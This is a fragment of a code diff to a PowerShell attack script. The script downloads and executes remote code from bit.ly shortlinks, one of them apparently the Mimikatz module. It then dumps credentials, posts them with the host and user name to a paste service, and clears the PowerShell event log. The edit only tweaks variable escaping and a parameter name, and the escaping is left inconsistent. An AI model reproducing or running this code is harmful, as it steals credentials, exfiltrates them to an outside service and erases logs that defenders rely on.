@@ -14,9 +14,9 @@ param (
 	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2A6R03X')
 	# Import Mimikatz module
 	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/1N83FXO')
-	`$Creds = Invoke-Mimikatz -DumpCreds
-	`$Description = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
-	New-Paste -api_key $api_key -description `$Description -paste `$Creds
+	$Creds = Invoke-Mimikatz -DumpCreds
+	$Description = 'Mimikatz Dump - ' + $env:COMPUTERNAME + '\' + $env:USERNAME
+	New-Paste -apikey $api_key -description `$Description -paste `$Creds
 	# Clear EventLog
 	Clear-EventLog -LogName 'Windows PowerShell'
 	"
